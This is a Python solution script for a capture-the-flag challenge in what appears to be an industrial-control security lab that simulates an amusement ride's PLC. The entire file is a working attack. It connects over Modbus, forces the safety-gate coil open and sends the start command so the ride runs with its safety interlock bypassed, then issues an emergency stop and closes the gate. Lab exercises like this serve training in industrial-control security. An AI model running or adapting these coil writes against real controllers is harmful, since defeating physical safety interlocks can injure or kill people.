#!/usr/bin/env python3
"""
Challenge 09: Safety Bypass (400 points)
Difficulty: Hard

Objective: Start Project Nexus with the safety gate open (safety_gate_closed = FALSE)
by manipulating the safety interlock system.

Requirements:
- Start ride with safety gate open
- Manipulate safety_gate_closed via Modbus (coil 4)
- Bypass must occur before ride starts

Educational Value:
- Learn safety interlock bypass techniques
- Understand critical safety systems
- Practice safety system manipulation
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def bypass_safety_gate():
    """
    Start ride with safety gate open
    """
    print("=" * 60)
    print("Challenge 09: Safety Bypass")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Check current state
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    if state != 0:
        print()
        print("⚠️  Ride must be in IDLE state for this challenge!")
        print("   Stop the ride first, then run this script.")
        client.close()
        return False

    # Read current safety gate status
    result = client.read_coils(4, 1, slave=1)
    if result.isError():
        print("✗ Failed to read safety gate status")
        client.close()
        return False

    gate_closed = result.bits[0]
    print(f"Current Safety Gate Status: {'CLOSED' if gate_closed else 'OPEN'}")
    print()

    print("⚠️  WARNING: This bypasses critical safety interlocks!")
    print()
    print("Attack sequence:")
    print("  1. Open the safety gate (set coil 4 to FALSE)")
    print("  2. Send start command while gate is open")
    print()

    # Step 1: Open the safety gate
    print("Step 1: Opening safety gate...")
    result = client.write_coil(4, False, slave=1)
    if result.isError():
        print("✗ Failed to open safety gate")
        client.close()
        return False
    print("  ✓ Safety gate opened (coil 4 = FALSE)")
    time.sleep(0.5)

    # Step 2: Send start command
    print()
    print("Step 2: Sending start command with gate open...")
    result = client.write_coil(10, True, slave=1)
    if result.isError():
        print("✗ Failed to send start command")
        client.close()
        return False
    print("  ✓ Start command sent (coil 10 = TRUE)")
    time.sleep(1)

    # Check if ride started
    result = client.read_holding_registers(2, 1, slave=1)
    if not result.isError():
        new_state = result.registers[0]
        print()
        print(f"New State: {new_state} ({state_names[new_state] if new_state < len(state_names) else 'Unknown'})")

        if new_state > 0:
            print()
            print("✓ Ride started with safety gate open!")
            print()
            print("🎯 Challenge 09 should now be completed!")
            print("   Critical safety interlock bypassed.")
            print("   Check the CTF dashboard to verify.")

            # Emergency stop and restore safety
            time.sleep(2)
            print()
            print("Emergency stopping and restoring safety...")
            client.write_coil(2, True, slave=1)  # E-stop
            time.sleep(0.5)
            client.write_coil(4, True, slave=1)  # Close gate
            print("✓ Safety restored")

            client.close()
            return True
        else:
            print()
            print("⚠️  Ride did not start. Safety interlocks may have prevented startup.")
            print("   Try again or check PLC logic.")

    client.close()
    return False

if __name__ == "__main__":
    try:
        bypass_safety_gate()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
